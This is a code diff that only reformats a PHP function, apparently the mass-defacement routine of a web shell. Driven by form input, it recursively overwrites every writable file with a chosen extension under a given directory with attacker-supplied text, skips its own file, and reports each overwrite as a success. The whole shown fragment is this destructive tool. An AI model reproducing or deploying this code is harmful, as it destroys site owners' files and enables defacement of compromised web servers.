@@ -225,42 +225,55 @@ input {
 if (isset($_POST['submit'])) {
     mass($_POST['dir'], $_POST['type'], $_POST['text']);
 }
-function mass($dir, $type, $text) {
-    if(is_writable($dir)) {
+function mass($dir, $type, $text)
+{
+    if (is_writable($dir)) {
         $getfile = scandir($dir);
-        foreach($getfile as $file) {
-            $path = $dir.DIRECTORY_SEPARATOR.$file;
-            if($file === '.' || filetype($path) == 'file') {
-                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
-                    ?>
+        foreach ($getfile as $file) {
+            $path = $dir . DIRECTORY_SEPARATOR . $file;
+            if ($file === '.' || filetype($path) == 'file') {
+                if (
+                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
+                        0 &&
+                    @preg_match(
+                        "/" . $file . "$/",
+                        $_SERVER['PHP_SELF'],
+                        $matches
+                    ) != 1
+                ): ?>
                     <tr>
                         <td>
                             <div class="alert alert-success">
-                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Successfully !</b>
+                                <?= $dir .
+                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Successfully !</b>
                             </div>
                         </td>
                     </tr>
-                    <?php
-                file_put_contents($path, $text);
-                endif;
-            } elseif($file === '..' || filetype($path) == 'file') {
-                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
-                    ?>
+                    <?php file_put_contents($path, $text);endif;
+            } elseif ($file === '..' || filetype($path) == 'file') {
+                if (
+                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
+                        0 &&
+                    @preg_match(
+                        "/" . $file . "$/",
+                        $_SERVER['PHP_SELF'],
+                        $matches
+                    ) != 1
+                ): ?>
                     <tr>
                         <td>
                             <div class="alert alert-success">
-                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Successfully !</b>
+                                <?= $dir .
+                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Successfully !</b>
                             </div>
                         </td>
                     </tr>
-                    <?php
-                file_put_contents($path, $text);
-                endif;
+                    <?php file_put_contents($path, $text);endif;
             } else {
-                if(is_dir($path)) {
-                    if(is_writable($path)) {
+                if (is_dir($path)) {
+                    if (is_writable($path)) {
                         @file_put_contents($path, $text);
-                        mass($path,$type,$text);
+                        mass($path, $type, $text);
                     }
                 }
             }
